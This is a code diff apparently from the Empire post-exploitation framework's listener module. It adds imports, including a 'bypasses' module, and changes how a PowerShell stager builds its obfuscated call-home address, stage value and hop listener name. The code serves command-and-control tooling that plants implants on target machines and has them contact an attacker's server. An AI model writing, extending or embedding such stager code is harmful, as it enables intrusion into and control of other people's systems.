@@ -4,6 +4,7 @@ from builtins import object
 import base64
 import random
 import copy
+import os
 import hashlib
 
 # Empire imports
@@ -12,6 +13,7 @@ from lib.common import agents
 from lib.common import encryption
 from lib.common import packets
 from lib.common import messages
+from lib.common import bypasses
 
 
 class Listener(object):
@@ -195,8 +197,9 @@ class Listener(object):
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
-                stager += "$ser="+helpers.obfuscate_call_home_address(host)+";$t='"+stage0+"';"
-                
+                #stager += "$ser="+helpers.obfuscate_call_home_address(host)+";$t='"+stage0+"';"
+                stager += "$ser='%s';$t='%s';$hop='%s';" % (helpers.obfuscate_call_home_address(host), stage0, listenerName)
+
                 #Add custom headers if any
                 if customHeaders != []:
                     for header in customHeaders:
